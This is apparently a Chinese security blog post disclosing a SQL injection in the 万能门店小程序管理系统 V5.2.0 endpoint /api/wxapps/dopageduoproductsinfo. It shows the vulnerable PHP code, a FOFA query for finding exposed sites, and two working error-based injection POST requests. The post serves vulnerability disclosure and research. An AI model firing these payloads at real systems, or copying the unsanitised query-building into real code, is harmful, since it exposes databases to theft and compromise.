---
title: "万能门店小程序管理系统 /api/wxapps/dopageduoproductsinfo SQL 注入漏洞"
source: https://mrxn.net/jswz/api-wxapps-dopageduoproductsinfo-sqli.html
asset_dir: assets/万能门店小程序管理系统-apiwxappsdopageduoproductsinfo-sql-注入漏洞
---

# 万能门店小程序管理系统 /api/wxapps/dopageduoproductsinfo SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/16 08:27
* 599浏览
* [0评论](#comment)
* 23分钟阅读

深入探索

安全

安全认证考试

Docker加速服务


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。是一个集成了会员管理和会员营销两大核心功能的综合性平台。它支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。该系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统 /api/wxapps/dopageduoproductsinfo 存在 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者可通过该漏洞获取数据库中的敏感信息，甚至可能进一步控制服务器。

SQL注入防护

# 影响版本

万能门店小程序全开源独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

深入探索

安全研究工具

云安全解决方案

网页浏览器

application/api/controller/Wxapps.php

```
//多规格数据自己规格
    public function dopageduoproductsinfo()
    {
        $uniacid = input("uniacid");
        $str = input('str');
        $arr = explode("######", $str);
        $id = input('id');
        $where = "";
        foreach ($arr as $key => &$res) {
            $vv = $key + 1;
            $where .= " and type" . $vv . " = " . "'" . $res . "'";
        }
        $prefix = config('database.prefix');
        $proinfo = Db::query("SELECT * FROM {$prefix}wd_xcx_duo_products_type_value WHERE pid= " . $id . $where);
        foreach ($proinfo as $key => &$value) {
            if ($value['thumb']) {
                $value['thumb'] = remote($uniacid, $value['thumb'], 1);
            }
            $value['salenum'] = $value['salenum'] + $value["vsalenum"];
        }
        $baseinfo = Db::name('wd_xcx_products')->where("id", $proinfo[0]['pid'])->find();
        if ($baseinfo['thumb']) {
            $baseinfo['thumb'] = remote($uniacid, $baseinfo['thumb'], 1);
        }
        if ($baseinfo['shareimg']) {
            $baseinfo['shareimg'] = remote($uniacid, $baseinfo['shareimg'], 1);
        }
        $adata['proinfo'] = $proinfo[0];
        $adata['baseinfo'] = $baseinfo;
        $result['data'] = $adata;
        return json_encode($result);
    }
```

* **id 参数**： 该参数未作任何过滤或转义，直接作为 SQL 中 pid 的值拼接,造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。
* **str 参数中的各个分割后子串**： $str 经 explode("######") 拆分后，每个部分都以 “and type{n} = '用户输入'” 的形式拼接到 SQL 语句中,造成SQL注入漏洞。

# 漏洞复现

```
POST /api/wxapps/dopageduoproductsinfo HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

id=1+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)%23
```

[![万能门店小程序管理系统 /api/wxapps/dopageduoproductsinfo SQL 注入漏洞](images/img-001-6333038e3a84.webp)](https://image.mrxn.net/a7d8b8bb6fe54d35bc4c2cd3abdfd0c8.webp)

```
POST /api/wxapps/dopageduoproductsinfo HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

str=a'+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)--
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万能门店小程序管理系统 /api/wxapps/dopageduoproductsinfo SQL 注入漏洞](https://mrxn.net/jswz/api-wxapps-dopageduoproductsinfo-sqli.html)  
文章链接：<https://mrxn.net/jswz/api-wxapps-dopageduoproductsinfo-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

代码安全审计

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-dopageduoproductsinfo-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞预警服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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